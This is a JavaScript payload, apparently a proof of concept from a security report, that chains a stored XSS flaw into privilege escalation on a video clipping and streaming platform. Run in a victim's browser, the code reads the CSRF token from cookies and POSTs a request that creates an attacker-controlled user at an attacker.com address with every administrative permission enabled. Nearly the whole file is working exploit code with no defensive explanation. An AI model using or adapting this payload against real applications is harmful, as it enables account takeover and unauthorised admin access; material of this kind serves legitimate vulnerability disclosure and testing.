// XSS-to-Privilege-Escalation Payload
// Chain: Stored XSS → Read CSRF token → Create new attacker-controlled admin user
(function(){
  var csrf = document.cookie.match(/csrftoken=([^;]+)/)[1];
  var profileData = JSON.stringify({
    "features":{
      "list_all_users":true,"edit_user":true,"disable_user":true,
      "list_all_profiles":true,"edit_profile":true,"edit_content_stream":true,
      "upload_file":true,"enable_live_streaming":true,"enable_clipping":true,
      "enable_dai_interface":true,"assign_clip_to_profile":true,
      "assign_imported_file_to_profile":true,"edit_clips":true,"delete_clips":true,
      "download_clips":true,"share_clips":true,"set_default_font":true,
      "create_and_edit_folder":true,"delete_folder":true,"edit_my_template":true,
      "edit_assigned_templates":true,"edit_all_templates":true,
      "delete_assigned_templates":true,"delete_my_templates":true,
      "delete_all_templates":true,"assign_template_to_profile":true,
      "list_all_destinations":true,"edit_destination":true,"access_schedule":true,
      "edit_schedule":true,"access_current_lives":true,
      "assign_schedule_to_profile":true,"edit_all_schedules":true,
      "view_all_schedules":true,"delete_my_schedules":true,
      "delete_assigned_schedules":true,"delete_all_schedules":true,
      "enable_live_studio":true,"edit_live_rooms":true,"delete_live_rooms":true,
      "assign_live_room_to_profile":true,"enable_channel_studio":true,
      "edit_channel_rooms":true,"delete_channel_rooms":true,
      "assign_channel_room_to_profile":true,"enable_dashboards":true,
      "get_user_clip_analytics":true,"list_all_triggers_and_workflows":true,
      "edit_trigger_and_workflow":true
    },
    "sources":[],"destinations":{"clip_data_plugins":[{"type":"title","clip_data_plugin":"title","renderer_params":{"default_value":"","value_for_publish":"","enabled":true,"mandatory":true}}],"global":[{"type":"use_thumbnail_as_cover_image","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":false,"mandatory":false}},{"type":"message","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":true,"mandatory":true}},{"type":"description","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":true,"mandatory":true}},{"type":"card_title","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":true,"mandatory":true}},{"type":"card_description","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":true,"mandatory":true}},{"type":"tags","renderer_params":{"default_value":[],"value_for_publish":[],"enabled":true,"mandatory":false}},{"type":"rip_type","renderer_params":{"default_value":"","value_for_publish":{"value":"","additional_values":"","text":""},"enabled":true,"mandatory":true}},{"type":"rip_restricted_regions","renderer_params":{"default_value":"Monde","value_for_publish":{"value":"Monde","additional_values":null,"text":"World"},"enabled":true,"mandatory":false}},{"type":"programid","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":true,"mandatory":false}},{"type":"nationality","renderer_params":{"default_value":"fr","value_for_publish":{"value":"fr","additional_values":null,"text":"FR"},"enabled":true,"mandatory":false}},{"type":"decorator","renderer_params":{"default_value":"","value_for_publish":{"value":"","additional_values":"","text":""},"enabled":true,"mandatory":false}},{"type":"roi","renderer_params":{"default_value":"{CLIP_ROI}","value_for_publish":{"value":"{CLIP_ROI}","additional_values":null,"text":"Compute from source"},"primary_text_to_variables":{"{CLIP_ROI}":{"field":"CLIP_ROI"}},"enabled":true,"mandatory":true}},{"type":"subtitles_publication","renderer_params":{"default_value":"Default","value_for_publish":{"value":"Default","additional_values":null,"text":"Default"},"enabled":true,"mandatory":false}},{"type":"subtitles_tracks","renderer_params":{"default_value":"s:::","value_for_publish":{"value":"s:::","additional_values":null,"text":"Default"},"enabled":true,"mandatory":false}},{"type":"embeddable","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":true,"mandatory":false}},{"type":"live_publish_start_at","renderer_params":{"default_value":null,"value_for_publish":null,"enabled":true,"mandatory":false}},{"type":"live_publish_decoration","renderer_params":{"default_value":"","value_for_publish":{"value":"","additional_values":"","text":""},"enabled":true,"mandatory":false}},{"type":"live_publish_rendition","renderer_params":{"default_value":"","value_for_publish":{"value":"","additional_values":"","text":""},"enabled":false,"mandatory":false}},{"type":"live_fallback_mode","renderer_params":{"default_value":"active","value_for_publish":"active","enabled":false,"mandatory":false}},{"type":"gif_quality","renderer_params":{"default_value":"Default","value_for_publish":{"value":"Default","additional_values":null,"text":"Medium"},"enabled":false,"mandatory":false}}],"destinations":[],"allFieldsValid":true,"invalidFields":{}},"streams":[],"stream_tags":[]
  });
  var body = "email=pos%40attacker.com"
    +"&first_name=POC&last_name=XSS_ADMIN"
    +"&profile_choices%5B%5D=2325"
    +"&has_custom_profile=true"
    +"&profile_data="+encodeURIComponent(profileData);
  var xhr = new XMLHttpRequest();
  xhr.open("POST","/apis/1.0/feature-3099/users/create",true);
  xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
  xhr.setRequestHeader("X-CSRFToken",csrf);
  xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");
  xhr.send(body);
})();
